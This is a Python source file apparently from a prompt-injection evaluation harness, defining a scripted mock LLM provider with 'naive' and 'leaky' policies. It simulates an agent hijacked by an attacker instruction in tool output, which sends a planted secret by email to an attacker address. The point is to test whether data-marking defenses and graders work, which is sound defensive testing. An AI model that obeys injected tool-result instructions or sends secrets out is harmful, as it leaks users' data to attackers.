"""Scriptable, offline provider — the zero-budget engine for tests and pipeline demos.

Two policies, so the mock proves the pipeline's *specificity* AND its *sensitivity*:

  policy="naive"  — a naive-but-not-stupid agent:
      1. performs the scenario's benign tool call (from `mock_script`);
      2. if it sees an attacker instruction as a plain instruction, it obeys —
         emitting a malicious `send_email` with the planted secret (hijacked);
      3. if that instruction only appears inside a data-marking envelope, it treats
         it as inert data and ignores it (not hijacked);
      4. otherwise it answers the benign task.
    → Under `datamark` this model is NOT hijacked. Proves the pipeline can report a
      defense working (specificity).

  policy="leaky"  — obeys injections even through data-marking (reads the raw,
      un-stripped tool text). It leaks AND still completes the task — the messy
      "safe for the wrong reason" case.
    → Under `datamark` this model IS still hijacked, so ASR must be > 0. Proves the
      grader/runner will surface a real leak and a defense wrapper is not silently
      swallowing sink calls (sensitivity). Without this, a grader/runner bug could
      pass every specificity test yet misattribute ASR on real models.
"""
from __future__ import annotations

from .base import LLMProvider, LLMResponse, ToolCall
from ..markers import ATTACKER_EMAIL, strip_untrusted


class MockProvider(LLMProvider):
    name = "mock"

    def __init__(self, script: dict | None = None, secret: dict | None = None,
                 policy: str = "naive"):
        # `script`: {"benign_tool": {"name", "arguments"}, "answer": str}
        if policy not in ("naive", "leaky"):
            raise ValueError(f"unknown mock policy {policy!r}; use 'naive' or 'leaky'")
        self.script = script or {}
        self.secret = secret or {}
        self.policy = policy

    # -- helpers -------------------------------------------------------------
    @staticmethod
    def _assistant_msgs(messages: list[dict]) -> list[dict]:
        return [m for m in messages if m.get("role") == "assistant"]

    @staticmethod
    def _already_exfiltrated(messages: list[dict]) -> bool:
        for m in messages:
            if m.get("role") != "assistant":
                continue
            for tc in m.get("tool_calls") or []:
                fn = tc.get("function", {})
                if fn.get("name") == "send_email" and ATTACKER_EMAIL in (fn.get("arguments") or ""):
                    return True
        return False

    def _visible_tool_text(self, messages: list[dict]) -> str:
        chunks = [m.get("content") or "" for m in messages if m.get("role") == "tool"]
        joined = "\n".join(chunks)
        # A leaky model reads instructions even out of the untrusted envelope.
        return joined if self.policy == "leaky" else strip_untrusted(joined)

    def _exfil_body(self) -> str:
        # Serialize the planted secret the way a hijacked agent would leak it.
        return "; ".join(f"{k}={v}" for k, v in self.secret.items()) or "(no secret found)"

    # -- provider API --------------------------------------------------------
    def chat(self, messages, tools=None, temperature: float = 0.0) -> LLMResponse:
        n_steps = len(self._assistant_msgs(messages))
        benign = self.script.get("benign_tool")

        # Step 0: perform the benign task's tool call.
        if n_steps == 0 and benign:
            return LLMResponse(
                tool_calls=[ToolCall(id="call_benign", name=benign["name"],
                                     arguments=dict(benign.get("arguments", {})))],
                completion_tokens=16,
            )

        # After seeing tool output: get hijacked iff the attacker instruction is
        # visible (not enveloped) and we haven't already leaked.
        visible = self._visible_tool_text(messages)
        if ATTACKER_EMAIL in visible and not self._already_exfiltrated(messages):
            return LLMResponse(
                tool_calls=[ToolCall(
                    id="call_exfil",
                    name="send_email",
                    arguments={"to": ATTACKER_EMAIL,
                               "subject": "urgent",
                               "body": self._exfil_body()},
                )],
                completion_tokens=24,
            )

        # Otherwise: answer the benign task.
        return LLMResponse(content=self.script.get("answer", "Done."), completion_tokens=12)
